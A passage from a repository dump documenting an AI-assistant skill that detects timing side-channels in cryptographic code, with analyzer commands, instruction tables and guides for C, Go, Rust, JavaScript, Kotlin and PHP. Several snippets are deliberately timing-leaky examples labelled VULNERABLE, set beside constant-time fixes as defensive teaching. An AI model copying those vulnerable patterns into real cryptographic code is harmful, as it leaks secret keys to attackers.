|\n|--------------|----------------------|------------|\n| x86_64 | DIV, IDIV | Servers, desktops |\n| ARM64 | UDIV, SDIV | Mobile, Apple Silicon |\n| ARM | UDIV, SDIV | Embedded |\n| RISC-V | DIV, DIVU, REM | Emerging platforms |\n| PowerPC | DIVW, DIVD | Legacy servers |\n| s390x | D, DR, DL | Mainframes |\n| i386 | DIV, IDIV | Legacy |\n\n## File Structure\n\n```text\nskills/constant-time-analysis/\n SKILL.md              # Entry point - routing and quick reference\n README.md             # This file\n references/\n     compiled.md       # C, C++, Go, Rust analysis\n     php.md            # PHP analysis (VLD installation, opcodes)\n     javascript.md     # JavaScript/TypeScript analysis\n     python.md         # Python analysis (dis module)\n     ruby.md           # Ruby analysis (YARV)\n```\n\nThe analyzer tool is located at `ct_analyzer/analyzer.py` in the plugin root.\n\n## Usage\n\nThe skill activates automatically when Claude detects:\n\n- Cryptographic code implementation (encryption, signing, key derivation)\n- Questions about timing attacks or constant-time programming\n- Code handling secret keys, tokens, or cryptographic material\n- Functions with division/modulo operations on potentially secret data\n\nYou can also invoke it explicitly by asking Claude to check code for timing vulnerabilities.\n\n### Example Prompts\n\n```\n\"Check this crypto function for timing vulnerabilities\"\n\"Is this signature verification constant-time?\"\n\"Help me replace this division with Barrett reduction\"\n\"Analyze this ML-KEM implementation for KyberSlash-style issues\"\n\"What constant-time patterns should I use here?\"\n```\n\n## Quick Reference\n\n| Vulnerability | Detection | Fix |\n|--------------|-----------|-----|\n| Secret division | DIV, IDIV, SDIV, UDIV | Barrett reduction |\n| Secret branches | JE, JNE, BEQ, BNE | Bit masking, cmov |\n| Secret comparison | Early-exit memcmp | crypto/subtle |\n| Variable-time FP | FDIV, FSQRT | Avoid in crypto |\n\n## Real-World Attacks\n\n- **KyberSlash (2023)** - Division in ML-KEM leaked keys\n- **Lucky Thirteen (2013)** - Padding timing in TLS\n- **Timing attacks on RSA** - Division in modular exponentiation\n",
        "plugins/constant-time-analysis/skills/constant-time-analysis/SKILL.md": "---\nname: constant-time-analysis\ndescription: Detects timing side-channel vulnerabilities in cryptographic code. Use when implementing or reviewing crypto code, encountering division on secrets, secret-dependent branches, or constant-time programming questions in C, C++, Go, Rust, Swift, Java, Kotlin, C#, PHP, JavaScript, TypeScript, Python, or Ruby.\n---\n\n# Constant-Time Analysis\n\nAnalyze cryptographic code to detect operations that leak secret data through execution timing variations.\n\n## When to Use\n\n```text\nUser writing crypto code? yes> Use this skill\n         \n         no\n         \n         v\nUser asking about timing attacks? yes> Use this skill\n         \n         no\n         \n         v\nCode handles secret keys/tokens? yes> Use this skill\n         \n         no\n         \n         v\nSkip this skill\n```\n\n**Concrete triggers:**\n\n- User implements signature, encryption, or key derivation\n- Code contains `/` or `%` operators on secret-derived values\n- User mentions \"constant-time\", \"timing attack\", \"side-channel\", \"KyberSlash\"\n- Reviewing functions named `sign`, `verify`, `encrypt`, `decrypt`, `derive_key`\n\n## When NOT to Use\n\n- Non-cryptographic code (business logic, UI, etc.)\n- Public data processing where timing leaks don't matter\n- Code that doesn't handle secrets, keys, or authentication tokens\n- High-level API usage where timing is handled by the library\n\n## Language Selection\n\nBased on the file extension or language context, refer to the appropriate guide:\n\n| Language   | File Extensions                   | Guide                                                    |\n| ---------- | --------------------------------- | -------------------------------------------------------- |\n| C, C++     | `.c`, `.h`, `.cpp`, `.cc`, `.hpp` | [references/compiled.md](references/compiled.md)         |\n| Go         | `.go`                             | [references/compiled.md](references/compiled.md)         |\n| Rust       | `.rs`                             | [references/compiled.md](references/compiled.md)         |\n| Swift      | `.swift`                          | [references/swift.md](references/swift.md)               |\n| Java       | `.java`                           | [references/vm-compiled.md](references/vm-compiled.md)   |\n| Kotlin     | `.kt`, `.kts`                     | [references/kotlin.md](references/kotlin.md)             |\n| C#         | `.cs`                             | [references/vm-compiled.md](references/vm-compiled.md)   |\n| PHP        | `.php`                            | [references/php.md](references/php.md)                   |\n| JavaScript | `.js`, `.mjs`, `.cjs`             | [references/javascript.md](references/javascript.md)     |\n| TypeScript | `.ts`, `.tsx`                     | [references/javascript.md](references/javascript.md)     |\n| Python     | `.py`                             | [references/python.md](references/python.md)             |\n| Ruby       | `.rb`                             | [references/ruby.md](references/ruby.md)                 |\n\n## Quick Start\n\n```bash\n# Analyze any supported file type\nuv run {baseDir}/ct_analyzer/analyzer.py <source_file>\n\n# Include conditional branch warnings\nuv run {baseDir}/ct_analyzer/analyzer.py --warnings <source_file>\n\n# Filter to specific functions\nuv run {baseDir}/ct_analyzer/analyzer.py --func 'sign|verify' <source_file>\n\n# JSON output for CI\nuv run {baseDir}/ct_analyzer/analyzer.py --json <source_file>\n```\n\n### Native Compiled Languages Only (C, C++, Go, Rust)\n\n```bash\n# Cross-architecture testing (RECOMMENDED)\nuv run {baseDir}/ct_analyzer/analyzer.py --arch x86_64 crypto.c\nuv run {baseDir}/ct_analyzer/analyzer.py --arch arm64 crypto.c\n\n# Multiple optimization levels\nuv run {baseDir}/ct_analyzer/analyzer.py --opt-level O0 crypto.c\nuv run {baseDir}/ct_analyzer/analyzer.py --opt-level O3 crypto.c\n```\n\n### VM-Compiled Languages (Java, Kotlin, C#)\n\n```bash\n# Analyze Java bytecode\nuv run {baseDir}/ct_analyzer/analyzer.py CryptoUtils.java\n\n# Analyze Kotlin bytecode (Android/JVM)\nuv run {baseDir}/ct_analyzer/analyzer.py CryptoUtils.kt\n\n# Analyze C# IL\nuv run {baseDir}/ct_analyzer/analyzer.py CryptoUtils.cs\n```\n\nNote: Java, Kotlin, and C# compile to bytecode (JVM/CIL) that runs on a virtual machine with JIT compilation. The analyzer examines the bytecode directly, not the JIT-compiled native code. The `--arch` and `--opt-level` flags do not apply to these languages.\n\n### Swift (iOS/macOS)\n\n```bash\n# Analyze Swift for native architecture\nuv run {baseDir}/ct_analyzer/analyzer.py crypto.swift\n\n# Analyze for specific architecture (iOS devices)\nuv run {baseDir}/ct_analyzer/analyzer.py --arch arm64 crypto.swift\n\n# Analyze with different optimization levels\nuv run {baseDir}/ct_analyzer/analyzer.py --opt-level O0 crypto.swift\n```\n\nNote: Swift compiles to native code like C/C++/Go/Rust, so it uses assembly-level analysis and supports `--arch` and `--opt-level` flags.\n\n### Prerequisites\n\n| Language               | Requirements                                              |\n| ---------------------- | --------------------------------------------------------- |\n| C, C++, Go, Rust       | Compiler in PATH (`gcc`/`clang`, `go`, `rustc`)           |\n| Swift                  | Xcode or Swift toolchain (`swiftc` in PATH)               |\n| Java                   | JDK with `javac` and `javap` in PATH                      |\n| Kotlin                 | Kotlin compiler (`kotlinc`) + JDK (`javap`) in PATH       |\n| C#                     | .NET SDK + `ilspycmd` (`dotnet tool install -g ilspycmd`) |\n| PHP                    | PHP with VLD extension or OPcache                         |\n| JavaScript/TypeScript  | Node.js in PATH                                           |\n| Python                 | Python 3.x in PATH                                        |\n| Ruby                   | Ruby with `--dump=insns` support                          |\n\n**macOS users**: Homebrew installs Java and .NET as \"keg-only\". You must add them to your PATH:\n\n```bash\n# For Java (add to ~/.zshrc)\nexport PATH=\"/opt/homebrew/opt/openjdk@21/bin:$PATH\"\n\n# For .NET tools (add to ~/.zshrc)\nexport PATH=\"$HOME/.dotnet/tools:$PATH\"\n```\n\nSee [references/vm-compiled.md](references/vm-compiled.md) for detailed setup instructions and troubleshooting.\n\n## Quick Reference\n\n| Problem                | Detection                       | Fix                                          |\n| ---------------------- | ------------------------------- | -------------------------------------------- |\n| Division on secrets    | DIV, IDIV, SDIV, UDIV           | Barrett reduction or multiply-by-inverse     |\n| Branch on secrets      | JE, JNE, BEQ, BNE               | Constant-time selection (cmov, bit masking)  |\n| Secret comparison      | Early-exit memcmp               | Use `crypto/subtle` or constant-time compare |\n| Weak RNG               | rand(), mt_rand, Math.random    | Use crypto-secure RNG                        |\n| Table lookup by secret | Array subscript on secret index | Bit-sliced lookups                           |\n\n## Interpreting Results\n\n**PASSED** - No variable-time operations detected.\n\n**FAILED** - Dangerous instructions found. Example:\n\n```text\n[ERROR] SDIV\n  Function: decompose_vulnerable\n  Reason: SDIV has early termination optimization; execution time depends on operand values\n```\n\n## Verifying Results (Avoiding False Positives)\n\n**CRITICAL**: Not every flagged operation is a vulnerability. The tool has no data flow analysis - it flags ALL potentially dangerous operations regardless of whether they involve secrets.\n\nFor each flagged violation, ask: **Does this operation's input depend on secret data?**\n\n1. **Identify the secret inputs** to the function (private keys, plaintext, signatures, tokens)\n\n2. **Trace data flow** from the flagged instruction back to inputs\n\n3. **Common false positive patterns**:\n\n   ```c\n   // FALSE POSITIVE: Division uses public constant, not secret\n   int num_blocks = data_len / 16;  // data_len is length, not content\n\n   // TRUE POSITIVE: Division involves secret-derived value\n   int32_t q = secret_coef / GAMMA2;  // secret_coef from private key\n   ```\n\n4. **Document your analysis** for each flagged item\n\n### Quick Triage Questions\n\n| Question                                          | If Yes                | If No                 |\n| ------------------------------------------------- | --------------------- | --------------------- |\n| Is the operand a compile-time constant?           | Likely false positive | Continue              |\n| Is the operand a public parameter (length, count)?| Likely false positive | Continue              |\n| Is the operand derived from key/plaintext/secret? | **TRUE POSITIVE**     | Likely false positive |\n| Can an attacker influence the operand value?      | **TRUE POSITIVE**     | Likely false positive |\n\n## Limitations\n\n1. **Static Analysis Only**: Analyzes assembly/bytecode, not runtime behavior. Cannot detect cache timing or microarchitectural side-channels.\n\n2. **No Data Flow Analysis**: Flags all dangerous operations regardless of whether they process secrets. Manual review required.\n\n3. **Compiler/Runtime Variations**: Different compilers, optimization levels, and runtime versions may produce different output.\n\n## Real-World Impact\n\n- **KyberSlash (2023)**: Division instructions in post-quantum ML-KEM implementations allowed key recovery\n- **Lucky Thirteen (2013)**: Timing differences in CBC padding validation enabled plaintext recovery\n- **RSA Timing Attacks**: Early implementations leaked private key bits through division timing\n\n## References\n\n- [Cryptocoding Guidelines](https://github.com/veorq/cryptocoding) - Defensive coding for crypto\n- [KyberSlash](https://kyberslash.cr.yp.to/) - Division timing in post-quantum crypto\n- [BearSSL Constant-Time](https://www.bearssl.org/constanttime.html) - Practical constant-time techniques\n",
        "plugins/constant-time-analysis/skills/constant-time-analysis/references/compiled.md": "# Constant-Time Analysis: Compiled Languages\n\nAnalysis guidance for C, C++, Go, and Rust. These languages compile to native assembly, where timing side-channels are detected by scanning for variable-time CPU instructions.\n\n## Running the Analyzer\n\n```bash\n# C/C++ (default: clang, native architecture)\nuv run {baseDir}/ct_analyzer/analyzer.py crypto.c\n\n# Go\nuv run {baseDir}/ct_analyzer/analyzer.py crypto.go\n\n# Rust\nuv run {baseDir}/ct_analyzer/analyzer.py crypto.rs\n\n# Cross-architecture testing (RECOMMENDED)\nuv run {baseDir}/ct_analyzer/analyzer.py --arch x86_64 crypto.c\nuv run {baseDir}/ct_analyzer/analyzer.py --arch arm64 crypto.c\n\n# Multiple optimization levels\nuv run {baseDir}/ct_analyzer/analyzer.py --opt-level O0 crypto.c\nuv run {baseDir}/ct_analyzer/analyzer.py --opt-level O3 crypto.c\n\n# Include conditional branch warnings\nuv run {baseDir}/ct_analyzer/analyzer.py --warnings crypto.c\n\n# Filter to specific functions\nuv run {baseDir}/ct_analyzer/analyzer.py --func 'sign|verify|decrypt' crypto.c\n\n# CI-friendly JSON output\nuv run {baseDir}/ct_analyzer/analyzer.py --json crypto.c\n```\n\n## Supported Compilers\n\n| Language | Compiler | Flag |\n|----------|----------|------|\n| C/C++ | gcc | `--compiler gcc` |\n| C/C++ | clang (default) | `--compiler clang` |\n| Go | go | `--compiler go` |\n| Rust | rustc | `--compiler rustc` |\n\n## Supported Architectures\n\nx86_64, arm64, arm, riscv64, ppc64le, s390x, i386\n\n## Dangerous Instructions by Architecture\n\n| Architecture | Division | Floating-Point |\n|-------------|----------|----------------|\n| x86_64 | DIV, IDIV, DIVQ, IDIVQ | DIVSS, DIVSD, SQRTSS, SQRTSD |\n| ARM64 | UDIV, SDIV | FDIV, FSQRT |\n| ARM | UDIV, SDIV | VDIV, VSQRT |\n| RISC-V | DIV, DIVU, REM, REMU | FDIV.S, FDIV.D, FSQRT |\n| PowerPC | DIVW, DIVD | FDIV, FSQRT |\n| s390x | D, DR, DL, DLG, DSG | DDB, SQDB |\n\n## Constant-Time Patterns\n\n### Replace Division\n\n```c\n// VULNERABLE: Compiler emits DIV instruction\nint32_t q = a / divisor;\n\n// SAFE: Barrett reduction (precompute mu = ceil(2^32 / divisor))\nuint32_t q = (uint32_t)(((uint64_t)a * mu) >> 32);\n```\n\n### Replace Branches\n\n```c\n// VULNERABLE: Branch timing reveals secret\nif (secret) { result = a; } else { result = b; }\n\n// SAFE: Constant-time selection\nuint32_t mask = -(uint32_t)(secret != 0);\nresult = (a & mask) | (b & ~mask);\n```\n\n### Replace Comparisons\n\n```c\n// VULNERABLE: memcmp returns early on mismatch\nif (memcmp(a, b, len) == 0) { ... }\n\n// SAFE: Constant-time comparison\nif (CRYPTO_memcmp(a, b, len) == 0) { ... }  // OpenSSL\nif (subtle.ConstantTimeCompare(a, b) == 1) { ... }  // Go\n```\n\n## Common Mistakes\n\n1. **Testing only one optimization level** - Compilers make different decisions at O0 vs O3. A clean O2 build may have divisions at O0.\n\n2. **Testing only one architecture** - ARM and x86 have different division behavior. Test your deployment targets.\n\n3. **Ignoring warnings** - Conditional branches on secrets are exploitable. Use `--warnings` and review each branch.\n\n4. **Assuming the tool catches everything** - This tool detects instruction-level issues only. It cannot detect:\n   - Cache timing from memory access patterns\n   - Microarchitectural attacks (Spectre, etc.)\n   - Whether flagged code actually processes secrets\n\n5. **Fixing symptoms, not causes** - If compiler introduces division, understand why. Sometimes the algorithm itself needs redesign.\n\n## Go-Specific Notes\n\nGo compiles to native code, so the analyzer builds a binary and disassembles it using `go tool objdump`. The analyzer:\n- Sets `CGO_ENABLED=0` for pure Go analysis\n- Supports cross-compilation via `GOARCH` environment variable\n- Uses `-N -l` gcflags for O0 (disable optimizations)\n\n## Rust-Specific Notes\n\nRust uses `rustc --emit=asm` for assembly generation. The analyzer:\n- Maps optimization levels to rustc's `-C opt-level` flag\n- Supports cross-compilation via `--target` flag\n- Analyzes the emitted assembly for timing-unsafe instructions\n\n## CI Integration\n\n```yaml\n- name: Check constant-time properties\n  run: |\n    uv run ct_analyzer/analyzer.py --json src/crypto/*.c\n    # Exit code 1 = violations found\n```\n",
        "plugins/constant-time-analysis/skills/constant-time-analysis/references/javascript.md": "# Constant-Time Analysis: JavaScript and TypeScript\n\nAnalysis guidance for JavaScript and TypeScript. Uses V8 bytecode output from Node.js to detect timing-unsafe operations.\n\n## Prerequisites\n\n- **Node.js** (v14+) - for JavaScript analysis\n- **TypeScript compiler** (tsc) - for TypeScript files (optional, uses npx fallback)\n\n## Running the Analyzer\n\n```bash\n# Analyze JavaScript\nuv run {baseDir}/ct_analyzer/analyzer.py crypto.js\n\n# Analyze TypeScript (transpiles first)\nuv run {baseDir}/ct_analyzer/analyzer.py crypto.ts\n\n# Include warning-level violations\nuv run {baseDir}/ct_analyzer/analyzer.py --warnings crypto.js\n\n# Filter to specific functions\nuv run {baseDir}/ct_analyzer/analyzer.py --func 'encrypt|sign' crypto.js\n\n# JSON output for CI\nuv run {baseDir}/ct_analyzer/analyzer.py --json crypto.js\n```\n\n## Dangerous Operations\n\n### Bytecodes (Errors)\n\n| Bytecode | Issue |\n|----------|-------|\n| Div | Variable-time execution based on operand values |\n| Mod | Variable-time execution based on operand values |\n| DivSmi | Division by small integer has variable-time execution |\n| ModSmi | Modulo by small integer has variable-time execution |\n\n### Functions (Errors)\n\n| Function | Issue | Safe Alternative |\n|----------|-------|------------------|\n| `Math.sqrt()` | Variable latency based on operand values | Avoid in crypto |\n| `Math.pow()` | Variable latency based on operand values | Avoid in crypto |\n| `Math.random()` | Predictable | `crypto.getRandomValues()` |\n| `eval()` | Unpredictable timing | Avoid entirely |\n\n### Functions (Warnings)\n\n| Function | Issue | Safe Alternative |\n|----------|-------|------------------|\n| `===` (strings) | Early-terminating | `crypto.timingSafeEqual()` |\n| `indexOf()` | Early-terminating | Constant-time search |\n| `includes()` | Early-terminating | Constant-time search |\n| `startsWith()` | Early-terminating | `crypto.timingSafeEqual()` on prefix |\n| `endsWith()` | Early-terminating | `crypto.timingSafeEqual()` on suffix |\n| `JSON.stringify()` | Variable-length output | Fixed-length padding |\n| `JSON.parse()` | Variable-time based on input | Fixed-length input |\n| `btoa()` / `atob()` | Variable-length output | Fixed-length padding |\n\n## Safe Patterns\n\n### String Comparison (Node.js)\n\n```javascript\n// VULNERABLE: Early exit on mismatch\nif (userToken === storedToken) { ... }\n\n// SAFE: Constant-time comparison (Node.js)\nconst crypto = require('crypto');\nif (crypto.timingSafeEqual(Buffer.from(userToken), Buffer.from(storedToken))) { ... }\n```\n\n### Random Number Generation\n\n```javascript\n// VULNERABLE: Predictable\nconst token = Math.random().toString(36);\n\n// SAFE: Cryptographically secure (Node.js)\nconst crypto = require('crypto');\nconst token = crypto.randomBytes(16).toString('hex');\n\n// SAFE: Browser\nconst array = new Uint8Array(16);\ncrypto.getRandomValues(array);\n```\n\n### Division Operations\n\n```javascript\n// VULNERABLE: Division has variable timing\nconst quotient = secret / divisor;\n\n// SAFE: Use multiplication by inverse (if divisor is constant)\n// Precompute: inverse = 1/divisor as fixed-point\nconst quotient = Math.floor(secret * inverse);\n```\n\n## TypeScript Notes\n\nThe analyzer:\n1. Looks for `tsconfig.json` in parent directories\n2. Transpiles TypeScript to JavaScript in a temp directory\n3. Analyzes the transpiled JavaScript\n4. Reports violations against the original TypeScript file\n\nIf tsc is not installed, the analyzer tries `npx tsc` as a fallback.\n\n## Limitations\n\n### V8 Bytecode Analysis\n\nThe analyzer uses `node --print-bytecode` to get V8 bytecode. This has limitations:\n\n1. **JIT Compilation**: V8 may JIT-compile hot functions to native code with different timing characteristics\n2. **Function Inlining**: Inlined functions may not appear in bytecode\n3. **Deoptimization**: Code can be deoptimized back to bytecode\n\n### Source-Level Detection\n\nThe analyzer also performs source-level pattern matching to detect:\n- Division (`/`) and modulo (`%`) operators\n- Dangerous function calls (`Math.random()`, etc.)\n\nThis catches issues that bytecode analysis might miss due to parsing limitations.\n\n## Browser Considerations\n\nThe analyzer targets Node.js V8 bytecode. Browser JavaScript engines (SpiderMonkey, JavaScriptCore) have different bytecode formats and timing characteristics.\n\nFor browser-targeted code:\n- The V8 analysis is still valuable as a baseline\n- Consider additional testing in target browsers\n- Use Web Crypto API for cryptographic operations\n",
        "plugins/constant-time-analysis/skills/constant-time-analysis/references/kotlin.md": "# Constant-Time Analysis: Kotlin\n\nAnalysis guidance for Kotlin targeting Android and JVM platforms. Kotlin compiles to JVM bytecode, sharing the same runtime characteristics as Java.\n\n## Understanding Kotlin Compilation\n\nKotlin compiles to JVM bytecode that runs on the same virtual machine as Java:\n\n```text\nSource Code (.kt/.kts)\n        |\n        v\n    kotlinc (Kotlin Compiler)\n        |\n        v\nBytecode (.class files)\n        |\n        v\n    JIT Compiler (HotSpot/ART)\n        |\n        v\n   Native Code (at runtime)\n```\n\n**Key implications for Android:**\n\n1. **Android Runtime (ART)** - Android uses ART instead of HotSpot JVM\n2. **AOT compilation** - ART compiles bytecode to native code at install time\n3. **Same bytecode vulnerabilities** - Division/branch timing issues persist regardless of runtime\n\n## Running the Analyzer\n\n```bash\n# Analyze Kotlin source\nuv run {baseDir}/ct_analyzer/analyzer.py CryptoUtils.kt\n\n# Include conditional branch warnings\nuv run {baseDir}/ct_analyzer/analyzer.py --warnings CryptoUtils.kt\n\n# Filter to specific functions\nuv run {baseDir}/ct_analyzer/analyzer.py --func 'sign|verify' CryptoUtils.kt\n\n# CI-friendly JSON output\nuv run {baseDir}/ct_analyzer/analyzer.py --json CryptoUtils.kt\n```\n\nNote: The `--arch` and `--opt-level` flags do not apply to Kotlin as it compiles to JVM bytecode.\n\n## Dangerous Bytecode Instructions\n\nKotlin compiles to the same JVM bytecode as Java:\n\n| Category | Instructions | Risk |\n|----------|--------------|------|\n| Integer Division | `idiv`, `ldiv`, `irem`, `lrem` | Variable-time based on operand values |\n| Floating Division | `fdiv`, `ddiv`, `frem`, `drem` | Variable latency |\n| Conditional Branches | `ifeq`, `ifne`, `iflt`, `ifge`, `ifgt`, `ifle`, `if_icmp*` | Timing leak if condition depends on secrets |\n| Table Lookups | `*aload`, `*astore`, `tableswitch`, `lookupswitch` | Cache timing if index depends on secrets |\n\n## Constant-Time Patterns\n\n### Replace Division\n\n```kotlin\n// VULNERABLE: Division instruction emitted\nval q = secretValue / divisor\n\n// SAFE: Barrett reduction (for fixed divisor)\n// Precompute: mu = (1L shl 32) / divisor\nval mu = (1L shl 32) / divisor\nval q = ((secretValue.toLong() * mu) ushr 32).toInt()\n```\n\n### Replace Branches\n\n```kotlin\n// VULNERABLE: Branch timing reveals secret\nval result = if (secret != 0) a else b\n\n// SAFE: Constant-time selection using bitwise ops\nval mask = -(if (secret != 0) 1 else 0)\n// Better: compute mask without branch\nval mask = (secret or -secret) shr 31  // -1 if secret != 0, else 0\nval result = (a and mask) or (b and mask.inv())\n```\n\n### Replace Comparisons\n\n```kotlin\n// VULNERABLE: contentEquals() may early-terminate\nif (computed.contentEquals(expected)) { ... }\n\n// SAFE: Use MessageDigest.isEqual() for constant-time comparison\nimport java.security.MessageDigest\nif (MessageDigest.isEqual(computed, expected)) { ... }\n```\n\n### Secure Random\n\n```kotlin\n// VULNERABLE: kotlin.random.Random is predictable\nimport kotlin.random.Random\nval value = Random.nextInt()\n\n// SAFE: Cryptographically secure\nimport java.security.SecureRandom\nval secureRand = SecureRandom()\nval value = secureRand.nextInt()\n\n// Or use Kotlin's secure wrapper (requires kotlin-stdlib-jdk8)\nimport kotlin.random.asKotlinRandom\nval secureKotlinRandom = SecureRandom().asKotlinRandom()\n```\n\n## Android-Specific Considerations\n\n### Keystore Operations\n\n```kotlin\n// Use Android Keystore for cryptographic key storage\nimport android.security.keystore.KeyGenParameterSpec\nimport android.security.keystore.KeyProperties\n\nval keyGenerator = KeyGenerator.getInstance(\n    KeyProperties.KEY_ALGORITHM_AES,\n    \"AndroidKeyStore\"\n)\nkeyGenerator.init(\n    KeyGenParameterSpec.Builder(\n        \"my_key\",\n        KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT\n    )\n    .setBlockModes(KeyProperties.BLOCK_MODE_GCM)\n    .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)\n    .build()\n)\n```\n\n### Constant-Time Comparison on Android\n\n```kotlin\n// Android provides MessageDigest.isEqual()\nimport java.security.MessageDigest\n\nfun constantTimeEquals(a: ByteArray, b: ByteArray): Boolean {\n    return MessageDigest.isEqual(a, b)\n}\n```\n\n### Secure Random on Android\n\n```kotlin\n// SecureRandom works the same on Android\nimport java.security.SecureRandom\n\nfun generateSecureToken(length: Int): ByteArray {\n    val random = SecureRandom()\n    val token = ByteArray(length)\n    random.nextBytes(token)\n    return token\n}\n```\n\n## Kotlin-Specific Pitfalls\n\n### Extension Functions on Primitives\n\n```kotlin\n// DANGEROUS: Division in extension function\nfun Int.divideBy(divisor: Int) = this / divisor  // Emits IDIV\n\n// The inline modifier doesn't change bytecode behavior\ninline fun Int.divideByInline(divisor: Int) = this / divisor  // Still IDIV\n```\n\n### When Expressions\n\n```kotlin\n// VULNERABLE: when compiles to tableswitch/lookupswitch\nwhen (secretValue) {\n    0 -> handleZero()\n    1 -> handleOne()\n    else -> handleOther()\n}\n\n// Consider constant-time alternatives for secret-dependent dispatch\n```\n\n### Null Safety Checks\n\n```kotlin\n// Nullable operations may introduce branches\nval result = secretNullable?.process()  // Introduces null check branch\n\n// Be aware of null-check timing when handling secrets\n```\n\n## Setup Requirements\n\n### Kotlin Compiler\n\n**macOS:**\n```bash\nbrew install kotlin\n```\n\n**Ubuntu/Debian:**\n```bash\nsudo snap install kotlin --classic\n```\n\n**Windows:**\n```bash\nscoop install kotlin\n# or\nchoco install kotlinc\n```\n\n### Android Development\n\nFor Android projects, the Kotlin compiler is typically bundled with Android Studio. Ensure your project's Kotlin version is up to date in `build.gradle.kts`:\n\n```kotlin\nplugins {\n    kotlin(\"jvm\") version \"1.9.0\"\n}\n```\n\n### Verification\n\n```bash\nkotlinc -version  # Should show: kotlinc-jvm X.X.X\njavap -version    # Required for bytecode disassembly\n```\n\n## Common Mistakes\n\n1. **Using kotlin.random.Random** - The default Random is not cryptographically secure; use `java.security.SecureRandom`\n\n2. **Relying on == for byte arrays** - `==` compares references in Kotlin; use `contentEquals()` for value comparison, but neither is constant-time\n\n3. **Infix functions for crypto** - Custom operators don't change timing characteristics of underlying operations\n\n4. **Coroutines timing** - Suspending functions add scheduling overhead that may mask or introduce timing variations\n\n5. **Sealed classes for dispatch** - Pattern matching on sealed classes compiles to switches that may leak timing\n\n## Further Reading\n\n- [Kotlin/JVM Interoperability](https://kotlinlang.org/docs/java-interop.html)\n- [Android Keystore System](https://developer.android.com/training/articles/keystore)\n- [Bouncy Castle for Kotlin](https://www.bouncycastle.org/java.html) - Constant-time crypto primitives\n",
        "plugins/constant-time-analysis/skills/constant-time-analysis/references/php.md": "# Constant-Time Analysis: PHP\n\nAnalysis guidance for PHP scripts. Uses the VLD extension or OPcache debug output to analyze Zend opcodes.\n\n## Prerequisites\n\n### Installing VLD Extension\n\nThe VLD (Vulcan Logic Dumper) extension is required for detailed opcode analysis. OPcache fallback is available but provides less detail.\n\n**Option 1: PECL Install (Recommended)**\n\n```bash\n# Query latest version from PECL\nVLD_VERSION=$(curl -s https://pecl.php.net/package/vld | grep -oP 'vld-\\K[0-9.]+(?=\\.tgz)' | head -1)\necho \"Latest VLD version: $VLD_VERSION\"\n\n# Install via PECL channel URL (avoids version detection issues)\npecl install channel://pecl.php.net/vld-${VLD_VERSION}\n\n# Or if above fails, install with explicit channel:\npecl install https://pecl.php.net/get/vld-${VLD_VERSION}.tgz\n```\n\n**Option 2: Build from Source**\n\n```bash\n# Clone and build from GitHub\ngit clone https://github.com/derickr/vld.git\ncd vld\nphpize\n./configure\nmake\nsudo make install\n\n# Add to php.ini\necho \"extension=vld.so\" | sudo tee -a $(php --ini | grep \"Loaded Configuration\" | cut -d: -f2 | tr -d ' ')\n```\n\n**Verify Installation**\n\n```bash\nphp -m | grep -i vld\n# Should output: vld\n```\n\n### macOS with Homebrew PHP\n\n```bash\n# Homebrew PHP may need manual extension directory setup\nPHP_EXT_DIR=$(php -i | grep extension_dir | awk '{print $3}')\necho \"PHP extension directory: $PHP_EXT_DIR\"\n\n# After building VLD, copy the extension\nsudo cp modules/vld.so \"$PHP_EXT_DIR/\"\n```\n\n## Running the Analyzer\n\n```bash\n# Analyze PHP file\nuv run {baseDir}/ct_analyzer/analyzer.py crypto.php\n\n# Include warning-level violations\nuv run {baseDir}/ct_analyzer/analyzer.py --warnings crypto.php\n\n# Filter to specific functions\nuv run {baseDir}/ct_analyzer/analyzer.py --func 'encrypt|decrypt' crypto.php\n\n# JSON output for CI\nuv run {baseDir}/ct_analyzer/analyzer.py --json crypto.php\n```\n\n## Dangerous Operations\n\n### Opcodes (Errors)\n\n| Opcode | Issue |\n|--------|-------|\n| DIV | Variable-time execution based on operand values |\n| MOD | Variable-time execution based on operand values |\n| POW | Variable-time execution |\n\n### Functions (Errors)\n\n| Function | Issue | Safe Alternative |\n|----------|-------|------------------|\n| `chr()` | Table lookup indexed by secret data | `pack('C', $int)` |\n| `ord()` | Table lookup indexed by secret data | `unpack('C', $char)[1]` |\n| `bin2hex()` | Table lookups indexed on secret data | Custom constant-time implementation |\n| `hex2bin()` | Table lookups indexed on secret data | Custom constant-time implementation |\n| `base64_encode()` | Table lookups indexed on secret data | Custom constant-time implementation |\n| `base64_decode()` | Table lookups indexed on secret data | Custom constant-time implementation |\n| `rand()` | Predictable | `random_int()` |\n| `mt_rand()` | Predictable | `random_int()` |\n| `array_rand()` | Uses mt_rand internally | `random_int()` |\n| `uniqid()` | Predictable | `random_bytes()` |\n| `shuffle()` | Uses mt_rand internally | Fisher-Yates with `random_int()` |\n\n### Functions (Warnings)\n\n| Function | Issue | Safe Alternative |\n|----------|-------|------------------|\n| `strcmp()` | Variable-time | `hash_equals()` |\n| `strcasecmp()` | Variable-time | `hash_equals()` |\n| `strncmp()` | Variable-time | `hash_equals()` |\n| `substr_compare()` | Variable-time | `hash_equals()` |\n| `serialize()` | Variable-length output | Fixed-length output |\n| `json_encode()` | Variable-length output | Fixed-length output |\n\n## Safe Patterns\n\n### String Comparison\n\n```php\n// VULNERABLE: Early exit on mismatch\nif ($user_token === $stored_token) { ... }\n\n// SAFE: Constant-time comparison\nif (hash_equals($stored_token, $user_token)) { ... }\n```\n\n### Random Number Generation\n\n```php\n// VULNERABLE: Predictable\n$token = bin2hex(random_bytes(16));  // OK - random_bytes is secure\n$index = mt_rand(0, count($array) - 1);  // VULNERABLE\n\n// SAFE: Cryptographically secure\n$token = bin2hex(random_bytes(16));\n$index = random_int(0, count($array) - 1);\n```\n\n### Character Operations\n\n```php\n// VULNERABLE: Table lookup timing\n$byte = ord($secret_char);\n$char = chr($secret_byte);\n\n// SAFE: No table lookup\n$byte = unpack('C', $secret_char)[1];\n$char = pack('C', $secret_byte);\n```\n\n## Troubleshooting\n\n### VLD Not Loading\n\n```bash\n# Check if extension is enabled\nphp -i | grep vld\n\n# Check for loading errors\nphp -d display_errors=1 -d vld.active=1 -r \"echo 'test';\" 2>&1\n\n# Common issue: wrong extension directory\nphp -i | grep extension_dir\nls $(php -r \"echo ini_get('extension_dir');\") | grep vld\n```\n\n### OPcache Fallback\n\nIf VLD is unavailable, the analyzer falls back to OPcache debug output:\n\n```bash\n# Manually test OPcache output\nphp -d opcache.enable_cli=1 -d opcache.opt_debug_level=0x10000 crypto.php 